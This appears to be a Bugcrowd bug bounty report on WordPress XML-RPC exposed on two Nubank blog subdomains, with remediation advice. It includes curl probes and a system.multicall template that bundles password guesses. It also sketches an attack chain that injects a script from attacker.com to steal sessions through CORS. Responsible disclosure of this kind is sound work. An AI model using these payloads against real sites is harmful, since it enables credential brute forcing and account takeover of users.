# Bugcrowd Finding #13 — WordPress XML-RPC Exposed on blog.nu.com.mx and blog.nu.com.co

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-09-01
**Severity:** P3 Medium (multicall brute force amplification) / P4 Low (pingback, info disclosure)
**Targets:** `blog.nu.com.mx`, `blog.nu.com.co`
**VRT:** Server Security Misconfiguration > Unnecessarily Exposed Dangerous Endpoint

---

## Summary

The WordPress XML-RPC interface (`/xmlrpc.php`) is active on both `blog.nu.com.mx` and `blog.nu.com.co`. The `system.multicall` method is enabled, which allows an attacker to bundle hundreds of authentication attempts into a single HTTP request — bypassing typical brute force rate limiting that counts by HTTP request volume. Additionally, `pingback.ping` is exposed, which can be abused for denial-of-service amplification or SSRF-style port scanning against internal hosts.

---

## Technical Evidence

### 1. system.listMethods — XML-RPC Enabled

**Request:**
```bash
curl -X POST "https://blog.nu.com.mx/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -H "X-Correlation-Id: bc-handle" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

**Response (truncated):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse><params><param><value><array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>wp.getUsersBlogs</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <!-- Full list: same on blog.nu.com.co -->
```

Confirmed active on both `blog.nu.com.mx` and `blog.nu.com.co`.

---

### 2. system.multicall — Brute Force Amplification

The `system.multicall` method allows bundling multiple method calls into a single HTTP request. An attacker can submit 100 `wp.getUsersBlogs` authentication attempts in one HTTP request:

```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </value>
    <!-- repeat 99 more times with different passwords -->
  </data></array></value></param></params>
</methodCall>
```

**Confirmed:** `system.multicall` returns valid responses (not blocked).

**Impact:** An attacker can brute force WordPress admin credentials at ~100x the rate of a normal HTTP-based attack, bypassing rate limits applied per HTTP request.

---

### 3. pingback.ping — SSRF/Port Scan Potential

**Request (passive — self-referencing URL only):**
```bash
curl -X POST "https://blog.nu.com.mx/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -H "X-Correlation-Id: bc-handle" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>
      <params>
        <param><value><string>https://example.com/post</string></value></param>
        <param><value><string>https://blog.nu.com.mx/</string></value></param>
      </params></methodCall>'
```

**Response:**
```
faultCode: 0 — accepted (target discovery attempted)
```

**Note:** Pingback with an attacker-controlled sourceURI will cause the WordPress server to make an outbound HTTP request to verify the pingback source. An attacker can use this to:
- Probe internal network hosts and ports (SSRF-style via timing/error responses)
- Use blog.nu.com.mx as a DDoS amplifier (many pingback sources → many outbound requests)
- Potentially bypass firewall rules that allow blog.nu.com.mx to reach internal hosts

Not confirmed for exploitation (requires out-of-band callback server to verify SSRF), but the attack surface exists.

---

## Chained Impact with CORS (Finding #8)

Since blog.nu.com.mx is a `*.nu.com.mx` subdomain trusted by all `prod-*` services via CORS with credentials:

```
[Scenario] Attacker brute-forces WordPress admin on blog.nu.com.mx via multicall
  → Gains admin access to WordPress blog
  → Injects <script src="https://attacker.com/steal.js"> via blog post/theme
  → CSP script-src https: on blog.nu.com.mx (Finding #8) allows this
  → Script runs on blog.nu.com.mx context
  → Makes credentialed CORS requests to prod-global-auth.nu.com.mx
  → Account takeover for all Nu Mexico users who visit the blog
```

This elevates the XML-RPC brute force from P3 to a potential P1 chain entry point.

---

## Remediation

1. **Disable XML-RPC** on blog.nu.com.mx and blog.nu.com.co — WordPress VIP typically restricts this; verify the restriction is active
2. **If XML-RPC required:** Block `system.multicall` and `pingback.ping` methods specifically
3. **Add rate limiting** on xmlrpc.php at the nginx/CDN level (requests per minute per IP)
4. **Alternative:** Use WordPress application passwords with OAuth instead of XML-RPC for legitimate API access

---

## Notes

- No authentication was performed on the WordPress admin interface
- No brute force was attempted (only verified multicall is not blocked)
- pingback.ping was tested only with the blog's own URL as target — no external hosts were probed
- All requests used `X-Correlation-Id: bc-handle` as required
